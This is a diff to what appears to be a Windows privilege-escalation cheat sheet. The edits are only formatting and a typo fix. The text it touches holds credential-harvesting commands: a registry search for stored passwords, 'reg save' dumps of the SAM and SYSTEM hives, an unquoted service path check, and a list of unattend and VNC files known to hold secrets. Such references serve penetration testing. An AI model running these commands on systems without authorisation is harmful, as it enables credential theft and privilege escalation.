@@ -54,6 +54,7 @@ Get-LocalUser | ft Name,Enabled,LastLogon
 ## Get intel for a specific local user 
 
 net user administrator
+
 Get-LocalUser administrator | fl *
 
 ## Get all local group
@@ -180,7 +181,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 
-## Check password in regigistre
+## Check password in registry
 reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s 
 
@@ -214,12 +215,19 @@ vssadmin list shadows
 ## Dump sam 
 
 reg save hklm\sam sam.hiv
+
 reg save hklm\system sys.hiv
+
 ## Some other interessing files
+
 c:\sysprep.inf
+
 c:\sysprep\sysprep.xml
+
 c:\unattend.xml
+
 %WINDIR%\Panther\Unattend\Unattended.xml
+
 %WINDIR%\Panther\Unattended.xml
 
 dir c:\*vnc.ini /s /b
